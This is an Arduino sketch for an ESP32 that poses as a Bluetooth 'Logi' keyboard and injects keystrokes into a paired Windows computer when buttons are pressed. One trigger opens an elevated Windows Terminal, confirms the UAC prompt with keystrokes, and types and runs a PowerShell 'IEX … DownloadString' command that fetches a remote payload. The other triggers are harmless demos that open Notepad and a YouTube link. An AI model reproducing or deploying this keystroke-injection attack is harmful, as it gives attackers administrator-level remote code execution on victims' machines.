//This program create by TechChip
//ESP32 BLE HID
#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Trigger 1
#define BUTTON_2_PIN 17 // Trigger 2
#define BUTTON_3_PIN 18 // Trigger 3
char kbd[] = "Logi"; //Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;

void setup() {
Serial.begin(115200);

pinMode(BUTTON_1_PIN, INPUT_PULLUP);
pinMode(BUTTON_2_PIN, INPUT_PULLUP);
pinMode(BUTTON_3_PIN, INPUT_PULLUP);

bleKeyboard.begin();
}

void loop() {
if (bleKeyboard.isConnected()) {
bool state1 = digitalRead(BUTTON_1_PIN);
bool state2 = digitalRead(BUTTON_2_PIN);
bool state3 = digitalRead(BUTTON_3_PIN);

// Trigger 1:
if (lastState1 == HIGH && state1 == LOW) {
Serial.println("Trigger 1 is running");
bleKeyboard.press(KEY_LEFT_GUI);
bleKeyboard.press('r');
delay(100);
bleKeyboard.releaseAll();
delay(1000);
bleKeyboard.print("notepad");
delay(100);
bleKeyboard.press(KEY_RETURN);
delay(100);
bleKeyboard.releaseAll();
delay(1000);
const char* txt = "Hello From ESP32 - This program create by TechChip";
for (int i=0; i < strlen(txt); i++) {
bleKeyboard.print(txt[i]);
delay(50);
}
}

// Trigger 2:
if (lastState2 == HIGH && state2 == LOW) {
bleKeyboard.press(KEY_LEFT_GUI);
bleKeyboard.press('r');
delay(100);
bleKeyboard.releaseAll();
delay(1000);
bleKeyboard.print("wt");
delay(100);
bleKeyboard.press(KEY_LEFT_CTRL);
bleKeyboard.press(KEY_LEFT_SHIFT);
bleKeyboard.press(KEY_RETURN);
delay(100);
bleKeyboard.releaseAll();
delay(3000);
bleKeyboard.press(KEY_LEFT_ARROW);
delay(100);
bleKeyboard.releaseAll();
delay(100);
bleKeyboard.press(KEY_RETURN);
delay(100);
bleKeyboard.releaseAll();
delay(5000);
const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('Your Powershell Payload URL')";
for (int i=0; i < strlen(cmd); i++) {
bleKeyboard.print(cmd[i]);
delay(50);
}
delay(1000);
bleKeyboard.press(KEY_RETURN);
delay(100);
bleKeyboard.releaseAll();
delay(1000);
}

// Trigger 3
if (lastState3 == HIGH && state3 == LOW) {
bleKeyboard.press(KEY_LEFT_GUI);
bleKeyboard.press('r');
delay(100);
bleKeyboard.releaseAll();
delay(1000);
const char* cmd = "https://www.youtube.com/@techchipnet";
for (int i=0; i < strlen(cmd); i++) {
bleKeyboard.print(cmd[i]);
delay(10);
}
delay(1000);
bleKeyboard.press(KEY_RETURN);
delay(100);
bleKeyboard.releaseAll();
delay(1000);

}

lastState1 = state1;
lastState2 = state2;
lastState3 = state3;
}

delay(10); // Small debounce
}
